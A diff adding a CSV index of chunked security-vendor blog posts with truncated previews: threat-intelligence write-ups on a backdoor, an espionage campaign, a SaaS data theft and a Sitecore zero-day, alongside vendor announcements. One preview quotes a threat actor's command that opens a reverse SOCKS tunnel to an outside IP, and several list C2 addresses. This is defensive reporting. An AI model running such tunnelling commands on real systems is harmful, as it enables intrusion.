@@ -1,0 +1,336 @@
+chunk_id,page_sequence,title,company,token_count,has_images,text_preview
+26334546-1_chunk_1,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,459,False,"Executive Summary
+Broadcom's VMware vSphere product continues to be a top choice for private cloud virtualization, underpinning important systems and critical infrastructure. Far from losing its appea..."
+26334546-1_chunk_2,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,606,False," about the risks, our next blog post contains  actionable guidance on how to defend your VMware vSphere estate . Additionally, register for our  upcoming webinar to learn these strategies directly fro..."
+26334546-1_chunk_3,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,678,False," vSphere with AD creates a flexible environment that simplifies identity management, yet it introduces profound security risks. This direct link can turn an AD compromise into a significant threat aga..."
+26334546-1_chunk_4,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,183,False, organizations focus their security efforts and EDR deployment inside the guest operating systems. This leaves the underlying ESXi hypervisor—the foundation of the entire virtualization environment—as...
+26334546-1_chunk_5,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,348,False," window to mitigate risks; however, threat actors aren't just relying on unpatched vulnerabilities. They frequently leverage compromised credentials, a lack of MFA, and simple misconfigurations to gai..."
+26334546-1_chunk_6,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,152,False," into a two-pronged approach: a tactical data exfiltration such as an AD database (NTDS.dit) and then the deployment of ransomware and mass encryption of all VMs.
+
+Understanding the Active Directory I..."
+26334546-1_chunk_7,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,918,False," security controls like multi-factor authentication (MFA), and the insecure default trust relationships it establishes. By examining these foundational mechanisms, we can expose the direct line from a..."
+26334546-1_chunk_8,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,303,False," Identity Federation (ADFS, Azure AD, etc.)
+**Granular Role-Based Access Control (RBAC)**
+Limited (via host profile or CLI only)
+Advanced RBAC with vCenter SSO
+
+Why Not to Use Likewise-Based AD Integr..."
+26334546-1_chunk_9,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,814,False," recommends leveraging identity federation with modern identity providers**, **bypassing the limitations of the legacy Likewise-based stack. Broadcom announced on March 25 that IWA will be removed in ..."
+26334546-1_chunk_10,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,1230,False," reliance on a delegated logon based on AD password complexity, and any MFA would have to be at the network access layer or workstation login, not at the vCenter login prompt for those users.
+
+The 'ES..."
+26334546-1_chunk_11,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,855,False," to the forefront: the inherent dangers of joining vSphere ESXi hosts directly to an AD domain. While such integration offers perceived management convenience, it establishes a level of trust that can..."
+26334546-1_chunk_12,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,939,False," as well, and that functionality continues to be supported. We recommend directing all configuration & usage through the Role-Based Access Controls (RBAC) present in vCenter Server, though.""
+Source:  ..."
+26334546-1_chunk_13,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,1663,False," expose the virtual infrastructure but also provide avenues to exploit the VCSA appliance's attack surface, such as its underlying Linux shell and the lack of comprehensive endpoint detection and resp..."
+26334546-1_chunk_14,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,859,False," compromised elsewhere in the network cannot be leveraged to gain access to these Tier 0 systems. This design creates defense in depth security barriers, fundamentally reducing the likelihood and impa..."
+26334546-1_chunk_15,1,Beyond Convenience: Exposing the Risks of VMware vSphere Active Directory Integration,Google,154,False,"le their entire virtualized infrastructure, leading to operational disruption and financial loss. The time to adopt a resilient, defense-in-depth security posture to protect these critical vSphere env..."
+26334546-2_chunk_1,2,Introducing Universal Logout for all Adaptive MFA customers,Okta,369,False,"Secure sessions, on your own terms. Okta is expanding the power of Universal Logout to more customers, providing better control over session management so that you can strengthen your organization’s s..."
+26334546-2_chunk_2,2,Introducing Universal Logout for all Adaptive MFA customers,Okta,353,False,") 
+ *Note: This means Super Admins can manually revoke access for three users per minute via the Okta Admin Console but can’t currently automate this process via API or Workflows integrations.
+
+Why ch..."
+26334546-3_chunk_1,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,86,False,"Welcome to the Frontline Bulletin Series
+Straight from Mandiant Threat Defense, the ""Frontline Bulletin"" series brings you the latest on the most intriguing compromises we are seeing in the wild right..."
+26334546-3_chunk_2,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,364,False," and respond to the most compelling threats we observe. This edition dissects an infection involving two threat groups, UNC5518 and UNC5774, leading to the deployment of CORNFLAKE.V3.
+
+Introduction
+Si..."
+26334546-3_chunk_3,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,515,False,". Mandiant attributes the CORNFLAKE.V3 samples to UNC5774, a distinct financially motivated actor that uses UNC5518's access-as-a-service operation as an entry vector into target environments.
+
+The CO..."
+26334546-3_chunk_4,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,1294,False,"/gweb-cloudblog-publish/images/cornflake-fig1.max-2100x2100.jpg
+
+Figure 1: The observed CORNFLAKE.V3 (Node.js) attack lifecycle
+
+Initial Lead
+Mandiant Threat Defense responded to suspicious PowerShell..."
+26334546-3_chunk_5,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,484,False,"
+• Credential harvesting attempts via Kerberoasting
+
+Host and AD-based reconnaissance
+Persistence via Registry Run key
+Credential harvesting attempts via Kerberoasting
+The following process tree was o..."
+26334546-3_chunk_6,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,1025,False," to a random IP address in the `hostsIP` list instead. Once a connection is successfully established, the  main  function is called.
+`mainloop``hosts``hostsIP``main`
+
+C2 Communication
+This function, n..."
+26334546-3_chunk_7,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,538,False,"The `path2file` variable is then set as an argument to `node.exe` in the newly created `ChromeUpdater` registry key. This ensures that the malware executes upon user logon.
+
+Executed Payloads
+As obser..."
+26334546-3_chunk_8,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,1379,False," these, it requests a Kerberos service ticket from which a password hash is extracted and formatted. These hashes are exfiltrated to the C2 server, where the attacker can attempt to crack them.
+
+PHP V..."
+26334546-3_chunk_9,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,457,False," transition from Node.js to PHP.
+`JS``DLL``.png``ACTIVE``AUTORUN`These changes suggest an ongoing effort by the threat actor to refine their malware against evolving security measures.
+
+A cmd.exe reco..."
+26334546-3_chunk_10,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,243,False," `WINDYTWIST.SEA` samples attempting to move laterally in the network of the infected machine.
+`WINDYTWIST`The following process tree was observed during the infection:
+
+Conclusion
+This investigation ..."
+26334546-3_chunk_11,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,433,False," Brown, Mike Hunhoff, Genwei Jiang, Mon Liclican, Preston Lewis, Steve Sedotto, Elvis Miezitis and Rommel Joven for their valuable contributions to this blog post.
+
+Detection Through Google Security O..."
+26334546-3_chunk_12,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,1109,False," are located in %AppData%.
+Search unusual network connections initiated by powershell.exe or mshta.exe to legitimate Node.js (nodejs.org) or PHP (windows.php.net) infrastructure domains.
+
+Indicators o..."
+26334546-3_chunk_13,3,A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor,Google,78,False,"151`
+`128.140.120[.]188`
+`177.136.225[.]135`
+WINDYTWIST.SEA backdoor C2 server addresses associated with UNC5774
+
+Outbound Links:
+https://security.googlecloudcommunity.com/community-blog-staging-priva..."
+26334546-4_chunk_1,4,CrowdStrike Named a Leader in 2025 IDC MarketScape for Exposure Management,CrowdStrike,284,True,"CrowdStrike has been named a Leader in the 2025 IDC MarketScape: Worldwide Exposure Management 2025 Vendor Assessment.
+
+CrowdStrike has redefined exposure management to meet the realities of today’s t..."
+26334546-4_chunk_2,4,CrowdStrike Named a Leader in 2025 IDC MarketScape for Exposure Management,CrowdStrike,468,True," the 2025 IDC MarketScape for Exposure Management.
+Extracted content: [IMAGE: CrowdStrike is positioned in the Leaders category in the 2025 IDC MarketScape for Exposure Management.]
+
+A Leader in Expos..."
+26334546-4_chunk_3,4,CrowdStrike Named a Leader in 2025 IDC MarketScape for Exposure Management,CrowdStrike,218,False," data and supporting proactive risk reduction.” We believe these strengths reinforce our position as the platform of choice for unifying exposure management, risk prioritization, and automated respons..."
+26334546-4_chunk_4,4,CrowdStrike Named a Leader in 2025 IDC MarketScape for Exposure Management,CrowdStrike,228,False," console, and unified data model that powers the Falcon platform. All exposure management data is also sent to CrowdStrike Falcon® Next-Gen SIEM so asset information can be correlated to respond to th..."
+26334546-5_chunk_1,5,What Is a Hybrid Mesh Firewall and Why It Matters,Palo Alto Networks,208,False,"Securing the Hybrid Network Landscape with a Hybrid Mesh Firewall Solution from Palo Alto Networks
+In today’s distributed, cloud-first world, enterprises face unprecedented challenges securing their n..."
+26334546-5_chunk_2,5,What Is a Hybrid Mesh Firewall and Why It Matters,Palo Alto Networks,366,False,", cloud-delivered management plane. It gives organizations the simplicity of consistency and visibility that they need to secure every part of their network, while reducing the cost and complexity of ..."
+26334546-5_chunk_3,5,What Is a Hybrid Mesh Firewall and Why It Matters,Palo Alto Networks,328,False," Precision AI.
+*The Strata Network Security Platform delivers the industry’s most comprehensive hybrid mesh firewall solution — unifying hardware, software and cloud form factors into a single, cloud-..."
+26334546-5_chunk_4,5,What Is a Hybrid Mesh Firewall and Why It Matters,Palo Alto Networks,221,False," standards bodies, such as GSMA and ETSI, which is a strength highlighted by Gartner.
+From manufacturing and utilities to government and defense, Palo Alto Networks protects hybrid networks at global ..."
+26334546-6_chunk_1,6,Palo Alto Networks Named a Leader in WW Incident Response Services,Palo Alto Networks,171,False,"Palo Alto Networks has been named a Leader in the2025 IDC MarketScape for Worldwide Incident Response Services.
+Global organizations face increasingly intense cyberattacks that cause millions, or even..."
+26334546-6_chunk_2,6,Palo Alto Networks Named a Leader in WW Incident Response Services,Palo Alto Networks,280,False," organizations, more effectively.
+To address these evolving threats, organizations need a strong, global incident response partner who can help them proactively prepare for, quickly respond to, and fu..."
+26334546-6_chunk_3,6,Palo Alto Networks Named a Leader in WW Incident Response Services,Palo Alto Networks,175,False," IDC Research Vice President Craig Robinson:
+""The firm's ability to contextualize incidents within the broader threat landscape adds significant value for clients seeking to understand not just what h..."
+26334546-6_chunk_4,6,Palo Alto Networks Named a Leader in WW Incident Response Services,Palo Alto Networks,319,False,".”
+Combining intelligence, technology and operational response, Unit 42 can shorten investigation time, reduce exposure, and improve outcomes, ultimately delivering efficiency gains across incident re..."
+26334546-7_chunk_1,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,273,False,"In March 2025, Google Threat Intelligence Group (GTIG) identified a complex, multifaceted campaign attributed to the PRC-nexus threat actor UNC6384. The campaign targeted diplomats in Southeast Asia a..."
+26334546-7_chunk_2,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,327,False," been added to the Google Safe Browsing list of unsafe web resources. Google Security Operations (SecOps) has also been updated with relevant intelligence, enabling defenders to hunt for this activity..."
+26334546-7_chunk_3,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,274,False," backdoor.
+!https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig1.max-2100x2100.png
+
+Figure 1: Attack chain diagram
+
+Malware Delivery: Captive Portal Hijack
+GTIG discove..."
+26334546-7_chunk_4,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,1028,False,"`!https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig2.max-1900x1900.png
+
+Figure 2: Captive portal redirect chain
+
+Fake Plugin Update
+After being redirected, the threat..."
+26334546-7_chunk_5,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,2901,False," and ""`Cancel`” options. However, the SOGU.SEC payload is likely already running on the target device, as neither button triggers any action relevant to the malware.
+`Install``Cancel`
+
+Malware Analysi..."
+26334546-7_chunk_6,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,294,False,", SOGU.SEC was observed communicating directly with the C2 IP address “`166.88.2[.]90`” using HTTPS.
+`166.88.2[.]90`
+
+Attribution
+GTIG attributes this campaign to UNC6384, a PRC-nexus cyber espionage ..."
+26334546-7_chunk_7,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,1220,False,"4 to protect users and customers. As part of this effort, Google continuously updates its protections and has taken specific action against this campaign.
+
+Acknowledgment
+A special thanks to Jon Danie..."
+26334546-7_chunk_8,7,Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats,Google,296,False,"ui.exe"" 9 780
+File Path
+%LOCALAPPDATA%\DNVjzaXMFO\
+C:\Users\Public\Intelnet\
+C:\Users\Public\SecurityScan\
+
+YARA Rules
+
+Outbound Links:
+https://support.google.com/a/answer/9007870?hl=en
+https://safebr..."
+26334546-8_chunk_1,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,306,False,"Update (August 28)
+Based on new information identified by GTIG, the scope of this compromise is not exclusive to the Salesforce integration with Salesloft Drift and impacts other integrations. We now ..."
+26334546-8_chunk_2,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,348,False," for those applications, and investigate all connected systems for signs of unauthorized access.
+Salesloft has now engaged Mandiant to assist in their investigation. See Salesloft’s updated advisory f..."
+26334546-8_chunk_3,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,106,False," from the Salesforce AppExchange until further notice pending further investigation. This issue does not stem from a vulnerability within the core Salesforce platform.
+GTIG, Salesforce, and Salesloft ..."
+26334546-8_chunk_4,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,1013,False,". For example, the threat actor ran the following sequence of queries to get a unique count from each of the associated Salesforce objects.
+**Query to Retrieve User Data**
+**Query to Retrieve Case Dat..."
+26334546-8_chunk_5,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,69,False," Permission: Remove the ""API Enabled"" permission from profiles and grant it only to authorized users via a Permission Set.
+Additional instructions and updates are available on the Salesloft Trust Cent..."
+26334546-8_chunk_6,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,661,False," on the Salesloft Trust Center and Salesforce advisory.
+
+Acknowledgments
+We would like to thank Salesforce, Salesloft, and other trusted partners for their collaboration and assistance in responding t..."
+26334546-8_chunk_7,8,Widespread Data Theft Targets Salesforce Instances via Salesloft Drift,Google,257,False,"
+192.42.116.179
+192.42.116.20
+194.15.36.117
+195.47.238.178
+195.47.238.83
+
+Outbound Links:
+https://trust.salesloft.com/?uid=Drift%2FSalesforce+Security+Notification
+https://www.salesloft.com/platform/d..."
+26334546-9_chunk_1,9,CrowdStrike to Acquire Onum to Transform How Data Powers the Agentic SOC,CrowdStrike,243,False,"Today, I’m excited to announce CrowdStrike’s agreement to acquire Onum, a leader in real-time telemetry pipeline management that will extend the CrowdStrike Falcon® platform’s data advantage. Onum del..."
+26334546-9_chunk_2,9,CrowdStrike to Acquire Onum to Transform How Data Powers the Agentic SOC,CrowdStrike,209,False," agentic era, stopping breaches requires real-time, high-fidelity data that fuels faster and smarter decisions. This is why CrowdStrike is acquiring Onum: to transform how security data powers the SOC..."
+26334546-9_chunk_3,9,CrowdStrike to Acquire Onum to Transform How Data Powers the Agentic SOC,CrowdStrike,545,False,".
+• Outcomes: By streaming optimized, high-quality telemetry directly into Falcon Next-Gen SIEM, customers can achieve up to 70% faster incident response with 40% less ingestion overhead.
+
+Transformin..."
+26334546-9_chunk_4,9,CrowdStrike to Acquire Onum to Transform How Data Powers the Agentic SOC,CrowdStrike,364,False," Onum delivers a real-time data architecture to accelerate SOC transformation, extend the advantage of Falcon Next-Gen SIEM, and give security agents the data they need to act autonomously and with pr..."
+26334546-9_chunk_5,9,CrowdStrike to Acquire Onum to Transform How Data Powers the Agentic SOC,CrowdStrike,96,False," differ materially, including the satisfaction of the acquisition’s closing conditions, our ability to integrate Onum, and other risks described in the filings we make with the Securities and Exchange..."
+26334546-10_chunk_1,10,CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services,CrowdStrike,358,False,"CrowdStrike has been named a Leader in the IDC MarketScape: Worldwide Incident Response Services 2025 Vendor Assessment. We believe this validation reflects CrowdStrike’s strength in delivering rapid,..."
+26334546-10_chunk_2,10,CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services,CrowdStrike,243,False,"dStrike also employs a follow-the-sun model, leveraging IR resources in the Americas, Europe, META, and APJ regions. This model allows continuous investigative progress and around-the-clock analyst av..."
+26334546-10_chunk_3,10,CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services,CrowdStrike,182,False," on to say, “these capabilities enhance the speed, accuracy, and consistency of CrowdStrike’s response services.” The result is rapid insights, more confident decisions, and better outcomes when time ..."
+26334546-10_chunk_4,10,CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services,CrowdStrike,417,False," proactively mature their security posture over time.
+
+By combining rapid response with long-term readiness, CrowdStrike enables organizations to transform crisis into control and emerge stronger, sma..."
+26334546-11_chunk_1,11,A Leader in the First Gartner Magic Quadrant for Hybrid Mesh Firewall,Palo Alto Networks,126,False,"One Platform, Every Environment: Trusted Partner for the Hybrid Network Security Future
+We are proud to share that Palo Alto Networks has been named **a Leader** in the inaugural 2025 Gartner Magic Qu..."
+26334546-11_chunk_2,11,A Leader in the First Gartner Magic Quadrant for Hybrid Mesh Firewall,Palo Alto Networks,366,False," **unified, AI-powered protection across every environment, delivered through one cloud-based management console.**
+!Magic Quadrant for hybrid mesh firewall.
+*Gartner Magic Quadrant for Hybrid Mesh Fi..."
+26334546-11_chunk_3,11,A Leader in the First Gartner Magic Quadrant for Hybrid Mesh Firewall,Palo Alto Networks,158,False," and advanced malware in real time with our cloud-delivered security services.
+If you’re new to the concept of HMF, explore our primer on What Is a Hybrid Mesh Firewall and Why It Matters.
+
+Trusted by..."
+26334546-11_chunk_4,11,A Leader in the First Gartner Magic Quadrant for Hybrid Mesh Firewall,Palo Alto Networks,380,False," the world’s largest telcos, backed by over 100 patents in mobile and 5G security.
+From manufacturing and utilities to government and defense, our platform protects hybrid networks at a global scale.
+..."
+26334546-12_chunk_1,12,The next chapter for Okta Privileged Access: Integrating Axiom to accelerate our roadmap,Okta,342,False,"We recently announced something exciting: Oktasigned a definitive agreement to acquire Axiom Security , a modern, identity-centric privileged access management (PAM) solution. Our teams plan to integr..."
+26334546-12_chunk_2,12,The next chapter for Okta Privileged Access: Integrating Axiom to accelerate our roadmap,Okta,228,False,". 
+ This acquisition allows us to accelerate our roadmap for expanded functionality around just-in-time access for databases and Kubernetes, while maintaining velocity on delivering other core functio..."
+26334546-12_chunk_3,12,The next chapter for Okta Privileged Access: Integrating Axiom to accelerate our roadmap,Okta,216,False," of critical resources. With new connectors and an AI-based application connector builder, the solution extends security to databases and Kubernetes environments, helping ensure least-privileged acces..."
+26334546-12_chunk_4,12,The next chapter for Okta Privileged Access: Integrating Axiom to accelerate our roadmap,Okta,336,False," the technology into our roadmap, we’ll share more details on pricing, particularly for databases and Kubernetes. Our goal is to keep pricing straightforward and aligned with the value customers get f..."
+26334546-13_chunk_1,13,Oktane 2025 preview: Identity security as the public sector’s AI-ready control plane,Okta,148,False,"AI is rewriting how every industry, including the public sector, works — from how residents discover services to how adversaries craft attacks. In that shift, identity has become the control plane tha..."
+26334546-13_chunk_2,13,Oktane 2025 preview: Identity security as the public sector’s AI-ready control plane,Okta,600,False," modernizing decades-old stacks, and how security leaders are countering AI-powered threats with identity-first defenses. 
+ If you work within the U.S. government or education ecosystem, this is your ..."
+26334546-13_chunk_3,13,Oktane 2025 preview: Identity security as the public sector’s AI-ready control plane,Okta,265,False,"IC) , and outline Okta’s vision for an identity security fabric that connects people, devices, apps, and AI services. He’ll also preview product announcements that help teams accelerate innovation wit..."
+26334546-13_chunk_4,13,Oktane 2025 preview: Identity security as the public sector’s AI-ready control plane,Okta,165,False,"
+• CIOs, CISOs, and architectsbuilding Zero Trust and AI governance roadmaps
+• Practitionerswho want real implementation detail — from directory migrations to policy design and incident response
+
+Why ..."
+26334546-14_chunk_1,14,Securing the AI Before Times,Palo Alto Networks,121,False,"The Summer 2025 meeting of the Aspen US Cybersecurity Group was a valuable gathering of minds from government, industry and academia. I had the privilege to attend and provide opening remarks for a se..."
+26334546-14_chunk_2,14,Securing the AI Before Times,Palo Alto Networks,399,False," than ever.
+As I reflect on the key takeaways from the meeting, three strategic themes resonate most strongly, and are insights that will fundamentally guide our approach to cyber resilience in the ye..."
+26334546-14_chunk_3,14,Securing the AI Before Times,Palo Alto Networks,329,False," be further automated and sophisticated, even targeting the data our models are trained on. This represents a new, high-stakes battleground, and securing our AI infrastructure is now an essential prer..."
+26334546-14_chunk_4,14,Securing the AI Before Times,Palo Alto Networks,372,False," blurring, compelling us to re-evaluate our zero trust principles and identity management strategies. We must collectively work to secure the ""human-machine interface,"" the critical touchpoints where ..."
+26334546-14_chunk_5,14,Securing the AI Before Times,Palo Alto Networks,347,False," privacy, access controls and ensuring data quality.
+
+This framework was met with significant interest because it provides practical guidelines for CISOs and CIOs to discuss AI risk in a structured, c..."
+26334546-15_chunk_1,15,Building AI-ready identity security with Okta Identity Security Posture Management,Okta,330,False,"When machines inherit dangerous permissions
+It's 3 a.m., and an AI agent is negotiating between your Salesforce instance, AWS infrastructure, and ServiceNow workflows. The agent operates tirelessly, m..."
+26334546-15_chunk_2,15,Building AI-ready identity security with Okta Identity Security Posture Management,Okta,412,False,"service accounts
+• AWSIAM roles
+• Okta Integration Networkapps and custom app integrations
+• GitHubOAuth apps
+• SnowflakeOAuth integrations 
+ !Evolution of identities (image)
+
+The AI agent inheritance..."
+26334546-15_chunk_3,15,Building AI-ready identity security with Okta Identity Security Posture Management,Okta,251,False,", making it easier for malicious actors, and you'd never know. 
+ 6. Misconfigured trust: Overly broad trust relationships create attack paths that machines can exploit faster than humans can detect.
+
+..."
+26334546-15_chunk_4,15,Building AI-ready identity security with Okta Identity Security Posture Management,Okta,211,False," accounts, through API keys and tokens, to modern OAuth apps and Salesforce AI Agents. 
+ Work on scale: Okta Identity Security Posture Management automatically discovers and classifies NHIs across you..."
+26334546-16_chunk_1,16,Secure AI at Machine Speed: Defending the Growing Attack Surface,CrowdStrike,243,False,"As AI becomes embedded across the enterprise — from customer-facing tools to backend automation — it dramatically expands the enterprise attack surface. Models, agents, apps, and data pipelines now sp..."
+26334546-16_chunk_2,16,Secure AI at Machine Speed: Defending the Growing Attack Surface,CrowdStrike,225,False,". It requires real-time, full-stack security purpose-built for AI. In this blog, we examine the expanding AI threat landscape and discuss how the CrowdStrike Falcon® platform addresses critical areas ..."
+26334546-16_chunk_3,16,Secure AI at Machine Speed: Defending the Growing Attack Surface,CrowdStrike,316,False," AI agents often operate autonomously, connecting to systems and SaaS platforms with elevated privileges.
+• Shadow AI: Employees adopt generative AI tools without governance, introducing unmanaged ris..."
+26334546-16_chunk_4,16,Secure AI at Machine Speed: Defending the Growing Attack Surface,CrowdStrike,139,False," Charlotte AI™ accelerates investigations with autonomous detection triage, cross-domain correlation, and intelligent analysis, empowering security teams to outpace AI-driven threats.
+
+!Securing AI wi..."
+26334546-16_chunk_5,16,Secure AI at Machine Speed: Defending the Growing Attack Surface,CrowdStrike,2290,False," unified architecture that delivers real-time protection, contextual intelligence, and compliance-aligned enforcement.
+
+This integrated approach ensures AI security is a foundational capability aligne..."
+26334546-16_chunk_6,16,Secure AI at Machine Speed: Defending the Growing Attack Surface,CrowdStrike,87,False,"5 Threat Hunting Report
+
+2. World Economic Forum, Strategic Cybersecurity Talent Framework, April 2024
+
+3. Immuta, The AI Security and Governance Report, 2024
+
+Outbound Links:
+https://www3.weforum.org..."
+26334546-17_chunk_1,17,Salesforce-Connected Third-Party Drift Application Incident Response,Palo Alto Networks,214,False,"Last week, Salesloft announced its Drift application was breached, which provided unauthorized access to its customer's Salesforce data. This supply chain attack impacted hundreds of organizations, in..."
+26334546-18_chunk_1,18,The Salesloft incident: A wake-up call for SaaS security and IPSIE adoption,Okta,155,False,"A recent security incident involving the compromise of Salesloft Drift, a popular marketing automation tool, has affected a large number of organizations.
+
+During this event, threat actors stole and r..."
+26334546-18_chunk_2,18,The Salesloft incident: A wake-up call for SaaS security and IPSIE adoption,Okta,370,False," not impacted by this incident.
+
+Our security team thoroughly investigated our systems and confirmed that while we observed evidence of attempts to access our resources using stolen tokens, our defens..."
+26334546-18_chunk_3,18,The Salesloft incident: A wake-up call for SaaS security and IPSIE adoption,Okta,222,False," exit nodes to create a trusted corporate network. This foundational step ensures that for our most vital applications that support this feature, we can enforce the network-level security necessary to..."
+26334546-18_chunk_4,18,The Salesloft incident: A wake-up call for SaaS security and IPSIE adoption,Okta,454,False,"), they couldn't use it because it wouldn't work on their own machine (the wrong lock). This control prevents the replay of stolen tokens, which was the central issue in this supply chain attack.
+
+Bui..."
+26334546-18_chunk_5,18,The Salesloft incident: A wake-up call for SaaS security and IPSIE adoption,Okta,144,False," be instantly revoked across all integrated applications, severing the attacker's access.
+
+These are just a few examples of the many ways that IPSIE helps to create a more secure and resilient SaaS ec..."
+26334546-18_chunk_6,18,The Salesloft incident: A wake-up call for SaaS security and IPSIE adoption,Okta,458,False,", it's just not evenly distributed.
+
+We urge all SaaS companies to join us in supporting the IPSIE initiative. By working together, we can make the entire SaaS ecosystem safer for everyone.
+
+What you ..."
+26334546-18_chunk_7,18,The Salesloft incident: A wake-up call for SaaS security and IPSIE adoption,Okta,80,False," types. This provides a single, consistent layer of defense, allowing you to proactively secure your organization from the inside out.
+
+To learn more about IPSIE, please visit the OpenID Foundation we..."
+26334546-19_chunk_1,19,EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware,CrowdStrike,253,False,"CrowdStrike data scientists are members of a team of cybersecurity researchers that recently released EMBER2024, an update to EMBER, the popular open source malware benchmark dataset originally releas..."
+26334546-19_chunk_2,19,EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware,CrowdStrike,304,False," of this, CrowdStrike researchers were excited for the opportunity to help update this very popular dataset. In this post, researchers can learn more about what this dataset provides and the new resea..."
+26334546-19_chunk_3,19,EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware,CrowdStrike,1317,False," to create EMBERSim, an effort to make building Binary Code Similarity techniques using benign data easier.
+
+EMBER2024 builds on the innovative and influential original, delivering a leap forward in c..."
+26334546-19_chunk_4,19,EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware,CrowdStrike,375,False," about the consistency of the files that get added to VirusTotal in any given time period, but there are still interesting questions about model degradation or other topics that can now be approached ..."
+26334546-20_chunk_1,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,163,False,"In a recent investigation, Mandiant Threat Defense discovered an active ViewState deserialization attack affecting Sitecore deployments leveraging sample machine keys that had been exposed in Sitecore..."
+26334546-20_chunk_2,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,609,False," earlier versions). Sitecore has confirmed that its updated deployments automatically generate unique machine keys and that affected customers have been notified.
+Refer to Sitecore’s advisory for more..."
+26334546-20_chunk_3,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,940,False," reconnaissance.
+`DWAgent`!https://storage.googleapis.com/gweb-cloudblog-publish/images/viewstate-sitecore-fig1.max-900x900.png
+
+Figure 1: Attack lifecycle
+
+Initial Compromise
+**External Reconnaissanc..."
+26334546-20_chunk_4,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,1186,False," have contained an output in the aforementioned format. As the threat actor continued their hands-on interaction with the server, Mandiant observed repeated HTTP POST requests with successful response..."
+26334546-20_chunk_5,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,318,False,":\Users\Public\Music""
+shell.Run ""ufp.exe -s rssocks -d 130.33.156[.]194 
+-e 443"", 1, False
+```
+
+Escalate Privileges
+Following initial compromise, the threat actor elevated their access from `NETWORK S..."
+26334546-20_chunk_6,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,601,False,"$`
+
+• `sawadmin`: Prior to dumping the registry hives, the threat actor executed `GoToken.exe`. Unfortunately, the binary was not available for analysis.
+
+`GoToken.exe`
+
+Maintain Presence
+The threat a..."
+26334546-20_chunk_7,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,339,False,"553c8ba051b792949f3c6d0`
+Binary executed prior to dumping of SAM/SYSTEM hives.
+Table 2:  File written in the DWAgent remote session
+
+Internal Reconnaissance
+**Active Directory Reconnaissance**
+During ..."
+26334546-20_chunk_8,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,281,False,"Hound`**Accounts Cleanup**
+With administrator accounts compromised, the earlier created `asp$` and `sawadmin` accounts were removed, signaling a shift to more stable and covert access methods.
+
+Move L..."
